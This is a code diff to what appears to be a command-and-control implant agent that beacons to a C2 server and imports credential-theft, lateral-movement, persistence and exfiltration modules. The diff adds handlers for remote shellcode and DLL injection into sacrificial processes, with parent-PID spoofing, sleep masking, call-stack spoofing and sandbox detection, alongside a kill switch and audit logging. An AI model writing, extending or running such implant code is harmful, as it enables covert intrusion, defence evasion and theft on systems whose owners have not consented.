@@ -5,7 +5,9 @@ from modules.persistence import Persistence
 from modules.lateral import LateralMovement
 from modules.credtheft import CredentialTheft
 from modules.exfil import Exfiltration
-from stealth import Stealth as AdvancedStealth
+from modules.stealth import Stealth as AdvancedStealth
+from modules.inject import Injector
+from modules.audit import setup_agent_safety, KillSwitch, AuditLogger, IntegrityMonitor, ForensicCollector
 
 C2_URL = os.getenv("C2_URL", "http://c2-server:8081")
 INTERVAL = 30
@@ -19,12 +21,7 @@ try:
 except ImportError:
     _router = None
 
-# Raphael advanced modules
-from modules.persistence import Persistence
-from modules.lateral import LateralMovement
-from modules.credtheft import CredentialTheft
-from modules.exfil import Exfiltration
-from modules.stealth import Stealth as AdvancedStealth
+AGENT_DIR = os.path.dirname(os.path.abspath(__file__))
 
 def _validate_config():
     if not C2_URL.startswith(("http://", "https://")):
@@ -231,15 +228,68 @@ async def execute_task(task: dict) -> dict:
             result = {"status": False, "detail": f"Unknown exfil method: {method}"}
         return {"result": result}
 
-    elif ttype == "stealth_init":
-        result = AdvancedStealth.initialize_all()
-        return {"result": result}
-
     elif ttype == "sandbox_check":
         result = AdvancedStealth.sandbox_detect()
         return {"result": result}
 
-    return {"error": f"unknown task type: {ttype}"}
+    elif ttype == "inject":
+        method = payload.get("method", "shellcode")
+        
+        if method == "shellcode":
+            shellcode = base64.b64decode(payload.get("shellcode_b64", ""))
+            if not shellcode:
+                output = {"error": "no_shellcode"}
+            else:
+                target_pid = payload.get("pid")
+                if not target_pid:
+                    target = payload.get("target", "dllhost.exe")
+                    target_pid = Injector.create_sacrificial_process(target)
+                
+                if target_pid:
+                    ppid = payload.get("ppid_spoof")
+                    success = Injector.inject_shellcode(target_pid, shellcode, ppid)
+                    output = {
+                        "success": success,
+                        "pid": target_pid,
+                        "size": len(shellcode),
+                    }
+                else:
+                    output = {"error": "could_not_create_target"}
+        
+        elif method == "dll":
+            dll_path = payload.get("dll_path")
+            pid = payload.get("pid")
+            ppid = payload.get("ppid_spoof")
+            success = Injector.inject_dll(pid, dll_path, ppid)
+            output = {"success": success}
+        
+        else:
+            output = {"error": f"unknown_method: {method}"}
+        
+        return {"task_id": task.get("id"), "result": output}
+    
+    elif ttype == "sleep_mask":
+        duration = payload.get("duration", 60)
+        AdvancedStealth.sleep_mask(duration)
+        output = {"slept": True, "duration": duration}
+        return {"task_id": task.get("id"), "result": output}
+    
+    elif ttype == "stealth_init":
+        results = AdvancedStealth.initialize_all()
+        output = {"stealth_results": results}
+        return {"task_id": task.get("id"), "result": output}
+    
+    elif ttype == "stealth_status":
+        from modules.syscall import get_resolver
+        resolver = get_resolver()
+        output = {"resolver_status": resolver.get_status()}
+        return {"task_id": task.get("id"), "result": output}
+    
+    elif ttype == "stack_spoof":
+        from modules.stealth import AdvancedStealth
+        context = AdvancedStealth.spoof_call_stack()
+        output = {"spoofed": context is not None}
+        return {"task_id": task.get("id"), "result": output}
 
 async def submit_result(agent_id: str, session_key: bytes, task_id: str, result: dict):
     redacted = {k: (_redact(v) if isinstance(v, str) else v) for k, v in result.items()}
@@ -251,11 +301,50 @@ async def submit_result(agent_id: str, session_key: bytes, task_id: str, result:
 async def main():
     _validate_config()
     agent_id, session_key = await register()
+    
+    # Initialize safety infrastructure (kill switch, audit, integrity)
+    kill_switch, audit_logger, integrity_monitor, forensic_collector = setup_agent_safety(
+        agent_id=agent_id,
+        session_id=session_key.hex() if isinstance(session_key, bytes) else session_key,
+        agent_dir=AGENT_DIR,
+        kill_switch_interval=3600,
+    )
+    
+    # Run initial stealth initialization
+    AdvancedStealth.initialize_all()
+    
     while True:
+        # Verify integrity before each beacon
+        ok, violations = integrity_monitor.verify_all()
+        if not ok:
+            audit_logger.log(
+                event_type="integrity_fail",
+                agent_id=agent_id,
+                session_id=session_key.hex() if isinstance(session_key, bytes) else session_key,
+                command="integrity_check",
+                result="fail",
+                details={"violations": violations},
+            )
+            kill_switch.trigger(KillSwitch.TriggerReason.INTEGRITY_FAILURE)
+            return
+        
         tasks = await heartbeat(agent_id, session_key)
         for task in tasks:
             result = await execute_task(task)
             await submit_result(agent_id, session_key, task["id"], result)
+            
+            # Audit log task execution
+            audit_logger.log(
+                event_type="task_executed",
+                agent_id=agent_id,
+                session_id=session_key.hex() if isinstance(session_key, bytes) else session_key,
+                command=task.get("type", "unknown"),
+                result="success" if "error" not in result else "fail",
+                details={"task_id": task["id"], "result_keys": list(result.keys())},
+            )
+        
+        # Reset dead man's switch on successful beacon
+        kill_switch.reset_dead_man_switch()
         await asyncio.sleep(INTERVAL)
 
 if __name__ == "__main__":
